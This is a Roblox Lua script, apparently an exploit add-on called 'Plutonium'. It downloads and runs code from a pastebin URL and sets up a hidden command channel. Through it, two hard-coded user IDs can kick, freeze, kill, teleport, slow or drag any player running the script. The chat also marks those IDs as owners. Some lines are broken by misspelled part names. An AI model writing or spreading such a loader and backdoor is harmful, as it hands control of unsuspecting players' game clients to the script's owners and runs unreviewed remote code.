local adminLib = loadstring(game:HttpGet("https://pastebin.com/raw/Hsk2G3zb"))()
local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local DefaultWalkspeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
local players = game:GetService("Players")
local plr = players.LocalPlayer

local adminHandler = adminLib.New({
  ["Admins"] = {
    1430029840,
    4611516290
  },
  ["WorkOnAdmin"] = false,
  ["Prefix"] = "."
})
local admins = {
  1430029840,
  4611516290
}
local function getPlayer(handler, argIndex)
  if not handler.args or #handler.args < 1 then return end
  local plrData = nil
  for i, v in pairs(players:GetPlayers()) do
    if string.find(string.lower(v.Name), string.lower(handler.args[argIndex or 1])) then
      plrData = v
      break
    end
  end
  return plrData
end

local function isPlayer(handler, argIndex)
  return not handler.args or #handler.args < 1 or string.find(string.lower(plr.Name), string.lower(handler.args[argIndex or 1]))
end

local function freeze()
	game.Players.LocalPlayer.Character.HumanoidRoortPartHumanoidRoortPart.Anchored = true
	game.Players.LocalPlayer.Character.HumanoidRoortPart.Anchored = true
end
local function unfreeze()
	game.Players.LocalPlayer.Character.HumanoidRoortPart.Anchored = false
	game.Players.LocalPlayer.Character.HumanoidRoortPart.Anchored = false
end
adminHandler.OnCommand = function (message, handler)
        local command = string.lower(handler.command)
  if command == "kick" then
        game.Players.LocalPlayer:Kick("[PLUTONIUM] - You Were Kicked By The Owner")
  end
  
  if command == "freeze" then
        freeze()
  end
  
  if command == "unfreeze" then
        unfreeze()
  end
 
  if command == "void" then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -3050, 0)
  end
  
  if command == "snail" then
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 4
  end
  
  if command == "unsnail" then
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = DefaultWalkspeed
  end
  
  if command == "kill" then
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
  end
  
  if command == "reveal" then
        handler.reply("Hello Paws! Its Good To See You")
  end
  
  if command == "follow" then
    local plrCheck = isPlayer(handler)
    if not plrCheck or not handler.admin.Character then return end
    if following then return end
    following = true
    local rootPart = handler.admin.Character.HumanoidRootPart
    while following and plr.Character and plr.Character.Humanoid and rootPart do
      plr.Character.Humanoid:MoveTo(rootPart.Position)
      task.wait()
    end
    following = false
  end
  if command == "unfollow" then
        following = false
  end
  if command == "bring" then
            local plrCheck = isPlayer(handler)
    if not plrCheck or not handler.admin.Character then return end
    plr.Character.HumanoidRootPart.Position = handler.admin.Character.HumanoidRootPart.Position
  end
end
TextChatService.OnIncomingMessage = function(message: TextChatMessage)
        if not table.find(admins, game.Players.LocalPlayer.UserId) then return end 
	local properties = Instance.new("TextChatMessageProperties")
	if message.TextSource then
		local player = Players:GetPlayerByUserId(message.TextSource.UserId)
			properties.PrefixText = "<font color='#3fff05'>[Plutonium Owner]</font> " .. message.PrefixText
		
	end

	return properties
end
for _,Player in pairs(game:GetService('Players'):GetChildren()) do
        if table.find(admins, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]' .. Player.DisplayName)
                        end
                   end
            end
      end
return admins
